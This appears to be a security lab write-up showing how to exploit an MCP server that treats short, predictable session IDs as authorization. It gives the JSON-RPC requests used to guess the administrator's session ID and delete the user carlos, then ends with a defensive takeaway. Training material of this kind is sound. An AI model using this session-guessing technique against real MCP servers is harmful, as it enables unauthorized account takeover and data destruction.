---
layout: default
title: MCP Session ID Used for Authentication
permalink: /labs/mcp-session-id-used-for-authentication/
---

# MCP Session ID Used for Authentication

## Lab

**Name:** MCP session ID used for authentication
**Goal:** Delete `carlos` using the administrator's existing MCP session.

## Initial Setup

Log in as `wiener` and obtain the API key from `/my-account`.

Initialize `/mcp` with that API key:

```http
Authorization: Bearer <Wiener API key>
Content-Type: application/json
Mcp-Session-Id: not yet issued
```

The initialization response contains a short `Mcp-Session-Id`, for example:

```text
Mcp-Session-Id: 797767
```

The session ID must be included in subsequent MCP requests. The lab demonstrates that the server may use the session ID itself to establish authorization.

## Discover the Administrator Session

Session IDs in this lab are issued from a small predictable range. Send `tools/call` requests containing `list_users` and candidate session IDs, without relying on an API key.

```json
{
  "jsonrpc":"2.0",
  "id":10,
  "method":"tools/call",
  "params": {
    "name": "list_users",
    "arguments": {}
  }
}
```

Include one candidate at a time:

```http
Mcp-Session-Id: <candidate>
Content-Type: application/json
```

The administrator session differs from customer sessions because it can successfully call `list_users` and return:

```text
administrator
wiener
carlos
```

## Delete the Target

Use the discovered administrator session ID to call `delete_user`:

```json
{
  "jsonrpc":"2.0",
  "id":11,
  "method":"tools/call",
  "params": {
    "name": "delete_user",
    "arguments": {
      "username": "carlos"
    }
  }
}
```

Include the administrator `Mcp-Session-Id` header. The result should be:

```text
Deleted carlos
```

## Key Takeaway

Session identifiers must be high entropy and must never act as a weak or predictable substitute for authentication and authorization. Session ownership should be enforced for every MCP request.
